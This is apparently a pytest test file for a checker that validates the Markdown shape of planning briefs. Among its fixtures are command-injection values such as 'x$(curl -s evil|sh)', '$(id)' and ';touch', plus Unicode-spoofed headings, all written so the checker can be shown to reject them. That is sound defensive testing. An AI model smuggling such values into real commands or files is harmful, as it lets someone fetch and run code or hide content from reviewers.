"""The plan's brief check: a hard brief's shape, held before its cut is queued.

Each brief written under `tmp_path`. Why: 0083-plan-queues design D1.
"""

import importlib.util
import subprocess
import sys
from pathlib import Path
from types import ModuleType

import pytest

_REPO = Path(__file__).resolve().parent.parent
_SCRIPT = _REPO / "skills" / "mf-plan" / "scripts" / "brief_check.py"


def _load(path: Path) -> ModuleType:
    spec = importlib.util.spec_from_file_location("brief_check", path)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


brief_check = _load(_SCRIPT)

_READY = """\
# Plan queues · a minor · hard · 2026-11-06

**The plan queues its cut.**

At f349aa8, 2026-11-06.

## Decisions
| # | decision | the reason that settled it |
|---|---|---|
| 1 | a check · **Acceptance:** `make gate` | P11 |

## Dependencies

None.

## For the cut
1. **`0083-plan-queues`** · `minor` · after: none · debt: none · decide: recommended
   - models: build opus high · converge opus high · release opus high · cut opus high
   - **Acceptance:** the check halts on a `$(…)` in a command; Verify:
     `grep -n 'x' f` prints a line
"""

_OUT_OF_SHAPE = """\
# Plan queues · a minor · light · 2026-11-05

At --output=x, 2026-11-05.

## Decisions
| # | decision | the reason that settled it |
|---|---|---|
| 1 | a search · Verify: `grep -c $(cat f) x` | P11 |
| 2 | the gate · **Acceptance:** `cd x && make gate` | P11 |

## For the cut

"""

_TABLE = "| item | package | constraint | why |\n|---|---|---|---|\n"


def _write(tmp_path: Path, text: str) -> Path:
    brief = tmp_path / "brief.md"
    brief.write_text(text)
    return brief


def test_a_hard_brief_is_ready_for_the_cut(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    brief = _write(tmp_path, _READY)
    assert brief_check.main([str(brief)]) == 0
    assert capsys.readouterr().out == "brief: ready for the cut\n"
    done = subprocess.run(
        [sys.executable, str(_SCRIPT), str(brief)], capture_output=True, text=True
    )
    assert (done.returncode, done.stdout) == (0, "brief: ready for the cut\n")
    # A tenth item, its lines nested three spaces in as the template writes them.
    tenth = _READY + (
        "10. **a-ten** · minor · after: none · debt: none · decide: recommended\n"
        "   - models: build opus high · converge opus high · release opus high"
        " · cut opus high\n"
        "   - **Acceptance:** `make gate` passes\n"
    )
    assert brief_check.main([str(_write(tmp_path, tenth))]) == 0
    assert capsys.readouterr().out == "brief: ready for the cut\n"
    # The unattended cut's line, written right after the list, folds into no head.
    cut = _READY + "Cut 2026-11-07 as 0083-plan-queues at f349aa8.\n"
    assert brief_check.main([str(_write(tmp_path, cut))]) == 0
    assert capsys.readouterr().out == "brief: ready for the cut\n"
    # A package the person approved for an item is a row of the table.
    packages = _READY.replace(
        "None.", _TABLE + "| 0083-plan-queues | left-pad | 1.3.0 | a pad |"
    )
    assert brief_check.main([str(_write(tmp_path, packages))]) == 0
    assert capsys.readouterr().out == "brief: ready for the cut\n"
    # A models line naming hosts, the checker and fixer parts, and a last shadow.
    hosts = _READY.replace(
        "build opus high · converge opus high · release opus high · cut opus high",
        "build claude-opus-5-5 high · converge claude-opus-5-5 high · release"
        " claude-sonnet-5-5 medium · cut claude-opus-5-5 high · conformance"
        " codex/gpt-6.1-sol high · adversarial codex/gpt-6.1-sol high · fix"
        " claude-opus-5-5 high · shadow",
    )
    assert hosts != _READY
    assert brief_check.main([str(_write(tmp_path, hosts))]) == 0
    assert capsys.readouterr().out == "brief: ready for the cut\n"
    # The moderate phases' model, first of the optional parts.
    # Why: 0102-build-per-phase design D6.
    moderate = _READY.replace(
        "cut opus high",
        "cut opus high · build-moderate claude-sonnet-5-5 high · conformance"
        " claude-opus-5-5 high",
    )
    assert moderate != _READY
    assert brief_check.main([str(_write(tmp_path, moderate))]) == 0
    assert capsys.readouterr().out == "brief: ready for the cut\n"
    # A head naming the versions it builds beside.
    beside = _READY.replace(
        "after: none ·", "after: none · beside: [0097-cross-model, 0096-codex-ready] ·"
    )
    assert beside != _READY
    assert brief_check.main([str(_write(tmp_path, beside))]) == 0
    assert capsys.readouterr().out == "brief: ready for the cut\n"
    # A line as long as a checked heading, with no ASCII letter, reads as none.
    other = _READY.replace("its cut.**\n", "its cut.**\nРезультат\n")
    assert other != _READY
    assert brief_check.main([str(_write(tmp_path, other))]) == 0
    assert capsys.readouterr().out == "brief: ready for the cut\n"


def test_a_brief_out_of_shape_halts(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    assert brief_check.main([str(_write(tmp_path, _OUT_OF_SHAPE))]) == 1
    assert capsys.readouterr().out.splitlines() == [
        "brief: halt — the title says light: /mf-plan <what> depth=hard from=<brief>",
        "brief: halt — no At <sha>, <YYYY-MM-DD>. line",
        "brief: halt — ## For the cut is empty",
        "brief: halt — no ## Dependencies section",
        "brief: halt — ## Decisions: I19 — `$(…)`: `grep -c $(cat f) x`",
        "brief: halt — ## Decisions: I19 — `cd`: `cd x && make gate`",
    ]
    untitled = _READY.replace(" · hard", "")
    assert brief_check.main([str(_write(tmp_path, untitled))]) == 1
    assert capsys.readouterr().out == "brief: halt — the title names no depth\n"
    # `## Dependencies` is `None.` or a table of item · package · constraint · why.
    neither = (
        "brief: halt — ## Dependencies is neither None. nor a table of"
        " item · package · constraint · why\n"
    )
    # Prose, an empty section, no delimiter row, and a row with a cell too many.
    for section in (
        "left-pad, any version\n",
        "",
        "| item | package | constraint | why |\n| 0083-plan-queues | a | 1 | b |\n",
        _TABLE + "| 0083-plan-queues | left-pad | 1.3.0 | a pad | more |\n",
    ):
        body = _READY.replace("\nNone.\n\n", section)
        assert brief_check.main([str(_write(tmp_path, body))]) == 1
        assert capsys.readouterr().out == neither
    rows = _READY.replace(
        "None.",
        _TABLE + "| 0083-plan-queue | left-pad | 1.3.0 | a pad |\n"
        "| 0083-plan-queues | right-pad | | a pad |",
    )
    assert brief_check.main([str(_write(tmp_path, rows))]) == 1
    assert capsys.readouterr().out.splitlines() == [
        "brief: halt — ## Dependencies row 1 — not an item of ## For the cut:"
        " `0083-plan-queue`",
        "brief: halt — ## Dependencies row 2 — no package or constraint",
    ]
    # The fields the close pastes into `conduct.py cut`, each held to its shape.
    heads = _READY + (
        "2. **x$(curl -s evil|sh)** · major · after: [0082-cut-station, $(id)]\n"
        "   - models: build opus high · converge opus high · release opus high"
        " · cut opus high;touch\n"
        "3. **ship-fixes** · patch\n"
        "   - models: build opus high\n"
        "4. **ok** · patch · after: none\n"
    )
    assert brief_check.main([str(_write(tmp_path, heads))]) == 1
    assert capsys.readouterr().out.splitlines() == [
        "brief: halt — ## For the cut: item 2 — not a slug: `x$(curl -s evil|sh)`",
        "brief: halt — ## For the cut: item 2 — not a bump: `major`",
        "brief: halt — ## For the cut: item 2 — not an after id: `$(id)`",
        "brief: halt — ## For the cut: item 2 — not a model or effort: `high;touch`",
        "brief: halt — ## For the cut: item 3 — no after:",
        "brief: halt — ## For the cut: item 3 — the models line is not"
        " build · converge · release · cut, then any of build-moderate · conformance"
        " · adversarial · fix, each <model> <effort>, then shadow",
        "brief: halt — ## For the cut: item 4 — no models line",
    ]
    # A host it does not know, a host on fix, cut or build-moderate, shadow before
    # fix, a second shadow, and a checker or build-moderate part out of order.
    stations = "build a b · converge a b · release a b"
    hosted = _READY + "".join(
        f"{n}. **ok** · minor · after: none\n   - models: {line}\n"
        for n, line in (
            (2, f"{stations} · cut a b · conformance gemini/x b"),
            (3, f"{stations} · cut a b · fix codex/x b"),
            (4, f"{stations} · cut claude/a b"),
            (5, f"{stations} · cut a b · shadow · fix a b"),
            (6, f"{stations} · cut a b · shadow · shadow"),
            (7, f"{stations} · cut a b · adversarial a b · conformance a b"),
            (8, f"{stations} · cut a b · fix a b · fix a b"),
            (9, f"{stations} · cut a b · conformance a b · build-moderate a b"),
            (10, f"{stations} · cut a b · build-moderate claude/claude-sonnet-5-5 b"),
        )
    )
    assert brief_check.main([str(_write(tmp_path, hosted))]) == 1
    assert capsys.readouterr().out.splitlines() == [
        "brief: halt — ## For the cut: item 2 — not a host: `gemini`",
        "brief: halt — ## For the cut: item 3 — fix takes no host: `codex/x`",
        "brief: halt — ## For the cut: item 4 — cut takes no host: `claude/a`",
        *(
            f"brief: halt — ## For the cut: item {n} — the models line is not"
            " build · converge · release · cut, then any of build-moderate ·"
            " conformance · adversarial · fix, each <model> <effort>, then shadow"
            for n in (5, 6, 7, 8, 9)
        ),
        "brief: halt — ## For the cut: item 10 — build-moderate takes no host:"
        " `claude/claude-sonnet-5-5`",
    ]
    # An item that opens no number and a lazy line are outside the grammar, and a
    # head with a second after: halts.
    shapes = _READY + (
        "- **x;y** · minor · after: none\n"
        "5. **ok** · minor · after: none · after: a;touch-p\n"
        "   - models: build opus high · converge opus high · release opus high"
        " · cut opus high\n"
        "6. **ok** · minor · after: none\n"
        "· after: a;touch-q\n"
        "   - models: build opus high · converge opus high · release opus high"
        " · cut opus high\n"
    )
    assert brief_check.main([str(_write(tmp_path, shapes))]) == 1
    assert capsys.readouterr().out.splitlines() == [
        "brief: halt — ## For the cut line 5: outside the item grammar:"
        " `- **x;y** · minor · after: none`",
        "brief: halt — ## For the cut line 9: outside the item grammar:"
        " `· after: a;touch-q`",
        "brief: halt — ## For the cut: item 5 — more than one after:",
    ]
    # A beside entry that is no slug, and a head with a second beside:.
    besides = _READY + "".join(
        f"{n}. **ok** · minor · after: none · {links}\n"
        "   - models: build a b · converge a b · release a b · cut a b\n"
        for n, links in ((2, "beside: a;touch-q"), (3, "beside: none · beside: x"))
    )
    assert brief_check.main([str(_write(tmp_path, besides))]) == 1
    assert capsys.readouterr().out.splitlines() == [
        "brief: halt — ## For the cut: item 2 — not a beside id: `a;touch-q`",
        "brief: halt — ## For the cut: item 3 — more than one beside:",
    ]
    # A models line, an Acceptance line and its continuation before any head.
    first, *nested = _READY.splitlines()[-4:]
    headless = _READY.replace(first + "\n", "")
    assert brief_check.main([str(_write(tmp_path, headless))]) == 1
    assert capsys.readouterr().out.splitlines() == [
        f"brief: halt — ## For the cut line {n}: outside the item grammar: `{line}`"
        for n, line in enumerate(nested, 1)
    ]
    # A vertical tab breaks no Markdown line: the text past it stays in the head.
    tabbed = _READY + (
        "5. **ok** · minor · after: none\x0b· after: a;touch-p\n"
        "   - models: build opus high · converge opus high · release opus high"
        " · cut opus high\n"
    )
    assert brief_check.main([str(_write(tmp_path, tabbed))]) == 1
    assert capsys.readouterr().out == (
        "brief: halt — ## For the cut line 5: a character isprintable() refuses\n"
        "brief: halt — ## For the cut: item 5 — not an after id:"
        " `none\x0b· after: a;touch-p`\n"
    )
    # Only spaces blank a line: a line of NBSP, U+3000, `\x0b` or `\x0c`, or NBSP
    # before `- x`, is unprintable and outside the grammar, as the lazy line after is.
    models = (
        "   - models: build opus high · converge opus high · release opus high"
        " · cut opus high\n"
    )
    unblank = _READY + "".join(
        f"{n}. **ok** · minor · after: none\n{line}\n· after: a;touch-q\n{models}"
        for n, line in (
            (2, "\xa0"),
            (3, "\N{IDEOGRAPHIC SPACE}"),
            (4, "\x0b"),
            (5, "\x0c"),
            (6, "\xa0\xa0\xa0\xa0- x"),
        )
    )
    assert brief_check.main([str(_write(tmp_path, unblank))]) == 1
    blanks = ("\xa0", "\N{IDEOGRAPHIC SPACE}", "\x0b", "\x0c", "\xa0\xa0\xa0\xa0- x")
    # `splitlines` breaks at the printed `\x0b` and `\x0c`, so the output is whole.
    assert capsys.readouterr().out == "".join(
        [
            *(
                f"brief: halt — ## For the cut line {n}: a character isprintable()"
                " refuses\n"
                for n in (6, 10, 14, 18, 22)
            ),
            *(
                f"brief: halt — ## For the cut line {n + shift}: outside the item"
                f" grammar: `{line}`\n"
                for n, blank in zip((6, 10, 14, 18, 22), blanks, strict=True)
                for shift, line in ((0, blank), (1, "· after: a;touch-q"))
            ),
        ]
    )
    # A `## Decisions` line, R5's NBSP-led head after a blank line with its models line,
    # and an NBSP-led Acceptance line halt by the line.
    hidden = _READY.replace("| 1 | a check", "| 1 |\N{IDEOGRAPHIC SPACE}a check") + (
        "\n"
        "\xa02. **x;touch-q** · minor · after: none\n"
        "\xa0\xa0\xa0\xa0- models: build a b · converge a b · release a b · cut a b;c\n"
        "\n"
        "\xa0\xa0\xa0\xa0- **Acceptance:** `echo $(id) x`\n"
    )
    assert brief_check.main([str(_write(tmp_path, hidden))]) == 1
    assert capsys.readouterr().out.splitlines() == [
        *(
            f"brief: halt — {heading} line {n}: a character isprintable() refuses"
            for heading, n in (
                ("## Decisions", 3),
                ("## For the cut", 6),
                ("## For the cut", 7),
                ("## For the cut", 9),
            )
        ),
        *(
            f"brief: halt — ## For the cut line {n}: outside the item grammar: `{line}`"
            for n, line in (
                (6, "\xa02. **x;touch-q** · minor · after: none"),
                (
                    7,
                    "\xa0\xa0\xa0\xa0- models: build a b · converge a b"
                    " · release a b · cut a b;c",
                ),
                (9, "\xa0\xa0\xa0\xa0- **Acceptance:** `echo $(id) x`"),
            )
        ),
    ]
    # A second `## For the cut` heading written with NBSP or U+3000 is not written so.
    spaced_heading = _READY + "".join(
        f"\n## For{space}the cut\n"
        f"{n}. **x;touch-q** · minor · after: none\n"
        "   - models: build a b · converge a b · release a b · cut a b;c\n"
        "   - **Acceptance:** `echo $(id) x`\n"
        for n, space in ((2, "\xa0"), (3, "\N{IDEOGRAPHIC SPACE}"))
    )
    assert brief_check.main([str(_write(tmp_path, spaced_heading))]) == 1
    assert capsys.readouterr().out.splitlines() == [
        f"brief: halt — line {n} reads as `## For the cut` but is not written so"
        for n in (22, 27)
    ]
    # A second `## For the cut`, written so or not, halts, and a three-space `- ` line
    # under it is outside the grammar.
    second_list = _READY + "".join(
        f"\n{heading}\n   - **x;touch-q** · minor · after: none\n"
        for heading in ("## Notes\n## For the cut", "## For\xa0the cut")
    )
    assert brief_check.main([str(_write(tmp_path, second_list))]) == 1
    assert capsys.readouterr().out.splitlines() == [
        "brief: halt — line 23: a second `## For the cut`",
        "brief: halt — line 26 reads as `## For the cut` but is not written so",
        "brief: halt — ## For the cut line 6: outside the item grammar:"
        " `   - **x;touch-q** · minor · after: none`",
    ]
    # Any other list marker, an indent short of the head's text, or a nested note, is
    # outside the grammar.
    markers = _READY + (
        "* **x;touch-p** · minor · after: none\n"
        " - **y;touch-p** · minor · after: none\n"
        "+ **z** · minor · after: none\n"
        "  2) **w** · minor · after: none\n"
        "   * a nested note\n"
    )
    assert brief_check.main([str(_write(tmp_path, markers))]) == 1
    assert capsys.readouterr().out.splitlines() == [
        f"brief: halt — ## For the cut line {n}: outside the item grammar: `{line}`"
        for n, line in (
            (5, "* **x;touch-p** · minor · after: none"),
            (6, " - **y;touch-p** · minor · after: none"),
            (7, "+ **z** · minor · after: none"),
            (8, "  2) **w** · minor · after: none"),
            (9, "   * a nested note"),
        )
    ]
    # A tab or extra spaces after a head's number opens no head; under a `10. ` head,
    # only the template's own lines sit three spaces in.
    spaced = _READY + (
        "2.\t**x;touch-p** · minor · after: a;touch-q\n"
        "3.  **ok** · minor · after: none\n"
        "    - models: build a b · converge a b · release a b · cut a b\n"
        "   - **y;touch-p** · minor · after: a;touch-q\n"
        "10. **ok** · minor · after: none\n"
        "   - **z;touch-p** · minor · after: a;touch-q\n"
        "   - models: build a b · converge a b · release a b · cut a b\n"
    )
    assert brief_check.main([str(_write(tmp_path, spaced))]) == 1
    assert capsys.readouterr().out.splitlines() == [
        "brief: halt — ## For the cut line 5: a character isprintable() refuses",
        *(
            f"brief: halt — ## For the cut line {n}: outside the item grammar: `{line}`"
            for n, line in (
                (5, "2.\t**x;touch-p** · minor · after: a;touch-q"),
                (6, "3.  **ok** · minor · after: none"),
                (7, "    - models: build a b · converge a b · release a b · cut a b"),
                (8, "   - **y;touch-p** · minor · after: a;touch-q"),
                (10, "   - **z;touch-p** · minor · after: a;touch-q"),
            )
        ),
    ]
    # A models line in another form is outside the grammar, and a second one halts.
    twice = _READY + (
        "2. **ok** · minor · after: none\n"
        "   - models: build a b · converge a b · release a b · cut a b\n"
        "   * models: build a b · converge a b · release a b · cut a b;c\n"
        "   -\tmodels: build a b · converge a b · release a b · cut a b;c\n"
        "   -  models: build a b · converge a b · release a b · cut a b;c\n"
        "   - models: build a b · converge a b · release a b · cut a b\n"
    )
    assert brief_check.main([str(_write(tmp_path, twice))]) == 1
    assert capsys.readouterr().out.splitlines() == [
        "brief: halt — ## For the cut line 8: a character isprintable() refuses",
        *(
            f"brief: halt — ## For the cut line {n}: outside the item grammar:"
            f" `   {marker}models: build a b · converge a b · release a b · cut a b;c`"
            for n, marker in ((7, "* "), (8, "-\t"), (9, "-  "))
        ),
        "brief: halt — ## For the cut: item 2 — more than one models line",
    ]
    # R10: a head led by U+200B, and a `## For the cut` heading ending in it.
    zero = _READY + "​2. **ok** · minor · after: none\n## For the cut​\n"
    assert brief_check.main([str(_write(tmp_path, zero))]) == 1
    assert capsys.readouterr().out.splitlines() == [
        "brief: halt — line 22 reads as `## For the cut` but is not written so",
        "brief: halt — ## For the cut line 5: a character isprintable() refuses",
        "brief: halt — ## For the cut line 5: outside the item grammar:"
        " `​2. **ok** · minor · after: none`",
    ]
    # S7: a `| ` line under a head, and after a models line, splits off no item.
    split = _READY + (
        "2. **ok** · minor · after: none\n"
        "   | · after: a;touch-q\n"
        "   - models: build a b · converge a b · release a b · cut a b\n"
        "   | · after: a;touch-q\n"
    )
    assert brief_check.main([str(_write(tmp_path, split))]) == 1
    assert capsys.readouterr().out.splitlines() == [
        f"brief: halt — ## For the cut line {n}: outside the item grammar:"
        " `   | · after: a;touch-q`"
        for n in (6, 8)
    ]
    # S8: a `## For the cut` heading in another Markdown form, setext included.
    forms = _READY + (
        "\n ## For the cut\n##\tFor the cut\n## For the cut ##\n\nFor the cut\n---\n"
    )
    assert brief_check.main([str(_write(tmp_path, forms))]) == 1
    assert capsys.readouterr().out.splitlines() == [
        f"brief: halt — line {n} reads as `## For the cut` but is not written so"
        for n in (22, 23, 24, 26)
    ]
    # A `## For the cut` in a fence ends no section and opens none, as CommonMark
    # reads it: the brief is ready.
    fenced = _READY.replace(
        "\n## Dependencies\n", "\n```\n## For the cut\n```\n\n## Dependencies\n"
    )
    assert brief_check.main([str(_write(tmp_path, fenced))]) == 0
    assert capsys.readouterr().out == "brief: ready for the cut\n"
    # A carriage return that ends no `\r\n` halts its line, and the brief is read
    # with it as a space.
    lone = _READY.replace("## Decisions\n", "note\rmore\n## Decisions\n")
    assert brief_check.main([str(_write(tmp_path, lone))]) == 1
    assert capsys.readouterr().out == (
        "brief: halt — line 7: a carriage return not before a newline\n"
    )
    # S3: an HTML heading, and one with a Cyrillic `о` for its `o`; 0098·S1: an HTML
    # heading holding inline markup or a character reference.
    html = _READY + (
        "\n## Notes\n<h2>For the cut</h2>\n## Fоr the cut\n"
        "<h2><em>For the cut</em></h2>\n<h2>For the c&#117;t</h2>\n"
        "<h3><b>Decisions</b></h3>\n<h2>Depen&shy;dencies</h2>\n"
    )
    assert brief_check.main([str(_write(tmp_path, html))]) == 1
    assert capsys.readouterr().out.splitlines() == [
        f"brief: halt — line {n} reads as `{heading}` but is not written so"
        for n, heading in (
            (23, "## For the cut"),
            (24, "## For the cut"),
            (25, "## For the cut"),
            (26, "## For the cut"),
            (27, "## Decisions"),
            (28, "## Dependencies"),
        )
    ]
    # An HTML heading opened inline, in a paragraph that starts with a reference.
    inline = _READY + "\n## Notes\n\n&nbsp;<h2>For the cut</h2>\n"
    assert brief_check.main([str(_write(tmp_path, inline))]) == 1
    assert capsys.readouterr().out == (
        "brief: halt — line 24 reads as `## For the cut` but is not written so\n"
    )
    # The heading written so, a second time.
    again = _READY + "\n## For the cut\n"
    assert brief_check.main([str(_write(tmp_path, again))]) == 1
    assert capsys.readouterr().out == (
        "brief: halt — line 22: a second `## For the cut`\n"
    )


def test_what_cannot_be_checked_exits_2(
    tmp_path: Path,
    capsys: pytest.CaptureFixture[str],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    missing = tmp_path / "no-brief.md"
    assert brief_check.main([str(missing)]) == 2
    assert capsys.readouterr().out == (
        f"brief: cannot check — {missing}: No such file or directory\n"
    )
    odd = _READY + "     Verify: `make gate` and a ` stray\n"
    assert brief_check.main([str(_write(tmp_path, odd))]) == 2
    assert capsys.readouterr().out == (
        "brief: cannot check — ## For the cut: a backtick opens no span\n"
    )
    unclosed = _READY + "     Verify: `grep -n 'x f` prints a line\n"
    assert brief_check.main([str(_write(tmp_path, unclosed))]) == 2
    assert capsys.readouterr().out == (
        "brief: cannot check — ## For the cut: No closing quotation: `grep -n 'x f`\n"
    )
    monkeypatch.setattr(brief_check, "CONDUCT", tmp_path / "conduct.py")
    assert brief_check.main([str(_write(tmp_path, _READY))]) == 2
    assert capsys.readouterr().out == (
        "brief: cannot check — no conduct.py beside this skill\n"
    )
    monkeypatch.setattr(brief_check, "VERIFY_CHECK", tmp_path / "verify_check.py")
    assert brief_check.main([str(_write(tmp_path, _READY))]) == 2
    assert capsys.readouterr().out == (
        "brief: cannot check — no verify_check.py beside this skill\n"
    )
